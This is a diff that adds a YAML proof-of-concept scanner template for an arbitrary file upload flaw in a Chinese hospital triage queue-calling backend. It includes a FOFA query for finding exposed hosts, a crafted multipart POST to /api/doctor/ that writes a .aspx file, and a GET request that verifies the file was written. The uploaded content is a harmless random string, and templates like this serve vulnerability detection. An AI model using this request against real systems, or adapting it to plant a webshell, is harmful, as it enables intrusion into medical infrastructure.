@@ -1,0 +1,71 @@
+id: poc-yaml-triage-call-number-doctor-anyfile-upload
+info:
+  name: 分诊叫号后台系统 doctor 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 分诊叫号后台系统
+  fofa: title="分诊叫号后台"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /api/doctor/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKZ5OA1LLddPA4mKc
+  data: '------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="doctorid"
+
+
+    0
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="login_id"
+
+
+    {{.t1}}.aspx
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="name"
+
+
+    22
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="title"
+
+
+    23
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="department"
+
+
+    24
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="description"
+
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc
+
+    Content-Disposition: form-data; name="icon"; filename="321.txt"
+
+    Content-Type: text/aspx
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryKZ5OA1LLddPA4mKc--'
+  expression: status_code == 200 && contains(body,`{"success":true,"msg":null}`)
+- method: GET
+  path: /web/images/{{.t1}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
